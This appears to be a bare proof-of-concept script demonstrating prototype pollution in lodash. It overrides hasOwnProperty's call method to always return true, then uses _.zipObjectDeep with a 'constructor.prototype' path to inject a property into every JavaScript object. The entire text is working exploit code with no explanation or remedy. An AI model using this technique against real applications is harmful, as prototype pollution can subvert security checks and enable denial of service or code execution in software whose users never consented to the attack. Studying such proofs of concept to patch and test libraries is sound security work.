Object.prototype.hasOwnProperty.call = () => true;
console.log({}.polluted);
const _ = require('lodash');
_.zipObjectDeep(['constructor.prototype.polluted'], ['yes']);
console.log({}.polluted);